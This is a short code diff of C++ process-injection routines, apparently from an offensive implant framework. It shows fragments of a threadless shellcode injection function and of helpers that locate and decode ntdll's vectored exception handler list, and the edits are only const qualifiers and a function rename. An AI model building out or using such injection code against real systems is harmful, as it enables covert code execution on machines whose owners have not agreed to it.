@@ -4,7 +4,7 @@
 
 namespace Injection {
 
-    VOID Threadless(const _threadless &writer, void *shellcode, size_t n_shellcode, size_t total) {
+    VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
         HEXANE
 
         HANDLE process = { };
@@ -53,7 +53,7 @@ namespace Injection {
 
     namespace Veh {
 
-        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask) {
+        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
             HEXANE
 
             LdrpVectorHandlerList *handlers = { };
@@ -76,7 +76,7 @@ namespace Injection {
             return handler;
         }
 
-        UINT_PTR PointerEncoder(uintptr_t const &pointer, const bool encode) {
+        UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode) {
             HEXANE
 
             uintptr_t encoded = 0;
@@ -101,7 +101,7 @@ namespace Injection {
             const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);
 
             const auto entry = GetFirstHandler(ntdll, writer.signature, writer.mask);
-            const auto handler = PointerEncoder(entry, false) + 0x20;
+            const auto handler = PointerEncodeDecode(entry, false) + 0x20;
 
             if (!entry) {
                 return FALSE;
